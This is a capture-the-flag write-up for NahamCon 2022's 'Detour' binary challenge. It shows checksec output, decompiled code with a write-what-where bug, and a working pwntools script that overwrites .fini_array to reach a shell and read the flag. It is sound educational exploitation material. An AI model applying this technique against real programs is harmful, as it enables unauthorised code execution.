# NahamCon CTF 2022

## Detour

> write-what-where as a service! Now how do I detour away from the intended path of execution?
>
> Author: @M_alpha#3534
>
> [`detour`](detour)

Tags: _pwn_ _x86-64_ _write-what-where_ 


## Summary

One-shot _write-what-where_ to overwrite `.fini_array` with _win_ function.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No RELRO--every time it's `.fini_array`.

Just overwrite `.fini_array` with a _win_ function if it exists (or grow your own).


### Decompile with Ghidra

```c
undefined8 main(void)
{
  long in_FS_OFFSET;
  undefined8 local_20;
  long local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("What: ");
  __isoc99_scanf(&DAT_00402013,&local_20);
  getchar();
  printf("Where: ");
  __isoc99_scanf(&DAT_0040201f,&local_18);
  getchar();
  *(undefined8 *)((long)&base + local_18) = local_20;
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}
```

`*(undefined8 *)((long)&base + local_18) = local_20;` is a _write-what-where_.

```c
void win(void)
{
  system("/bin/sh");
  return;
}
```

And there's the _win_ function.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./detour', checksec=False)

if args.REMOTE:
    p = remote('challenge.nahamcon.com', 32549)
else:
    p = process(binary.path)

p.sendlineafter(b'What: ', str(binary.sym.win).encode())
p.sendlineafter(b'Where: ',str(binary.get_section_by_name('.fini_array').header.sh_addr - binary.sym.base).encode())
p.interactive()
```

Overwrite `.fini_array` with the location of the function `win`.

> _Where_ needs to be less `base`, since `base` is added to `where` in `*(undefined8 *)((long)&base + local_18) = local_20;`

Output:

```bash
# ./exploit.py REMOTE=1
[+] Opening connection to challenge.nahamcon.com on port 32549: Done
[*] Switching to interactive mode
$ cat flag.txt
flag{787325292ef650fa69541722bb57bed9}
```
